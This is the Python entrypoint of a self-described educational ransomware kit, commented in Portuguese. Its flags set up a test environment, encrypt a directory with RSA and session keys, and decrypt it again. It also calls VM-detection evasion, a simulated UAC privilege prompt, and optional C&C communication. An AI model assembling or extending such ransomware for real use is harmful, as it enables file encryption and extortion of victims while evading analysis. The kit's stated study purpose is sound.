"""
Entrypoint Principal do Kit de Análise de Ransomware

Este script processa os argumentos da linha de comando para orquestrar as ações 
de configuração, criptografia e descriptografia, utilizando os módulos refatorados.
"""
import sys
import os

from ransomware.core import AdvancedRansomware
from ransomware.utils import create_test_environment, detect_vm, simulate_uac_prompt

def main():
    """Função principal que gerencia a execução baseada nos argumentos."""
    # --- Verificação de Dependências Opcionais ---
    try:
        import requests
    except ImportError:
        print("[AVISO] A biblioteca 'requests' não está instalada.")
        print("[AVISO] A simulação de comunicação C&C será desativada.")
        print("[AVISO] Para habilitá-la, instale com: pip install requests")
    try:
        import psutil
    except ImportError:
        print("[AVISO] A biblioteca 'psutil' não está instalada.")
        print("[AVISO] A simulação de detecção de VM será desativada.")
        print("[AVISO] Para habilitá-la, instale com: pip install psutil")

    print("=" * 70)
    print("RANSOMWARE AVANÇADO EDUCACIONAL - APENAS PARA ESTUDO")
    print("AVISO: Use apenas em ambiente isolado e controlado!")
    print("=" * 70)

    # --- Simulações de Evasão e Elevação de Privilégio ---
    detect_vm()
    simulate_uac_prompt()
    # -----------------------------------------------------
    
    if len(sys.argv) < 2:
        print("\nUso:")
        print("  python main.py --setup      # Cria ambiente de teste seguro")
        print("  python main.py --encrypt    # Simula o ataque de criptografia")
        print("  python main.py --decrypt    # Recupera os arquivos criptografados")
        print("\nEstrutura Profissional com Módulos:")
        print("  • ransomware/core.py: Classe principal do ransomware")
        print("  • ransomware/config.py: Configurações do ataque")
        print("  • ransomware/utils.py: Funções auxiliares e de simulação")
        return

    action = sys.argv[1]

    if action == "--setup":
        create_test_environment()

    elif action == "--encrypt":
        ransomware = AdvancedRansomware()
        ransomware.generate_rsa_keys()
        ransomware.generate_session_key()
        ransomware.encrypt_directory()

    elif action == "--decrypt":
        log_files = [f for f in os.listdir('.') if f.startswith('.log_')]
        if not log_files:
            print("[-] Nenhum log de criptografia encontrado para iniciar a descriptografia!")
            return

        # Assume o log mais recente se houver múltiplos
        latest_log = max(log_files, key=lambda f: os.path.getmtime(f))
        print(f"[+] Usando o arquivo de log mais recente: {latest_log}")

        ransomware = AdvancedRansomware()
        # Extrai o session_id do nome do arquivo de log
        ransomware.session_id = latest_log.split('_')[1].replace('.json', '')
        ransomware.key_file = f".key_{ransomware.session_id}.enc"

        if ransomware.load_master_key():
            ransomware.decrypt_directory(latest_log)
    else:
        print(f"[-] Ação desconhecida: {action}")

if __name__ == "__main__":
    main()
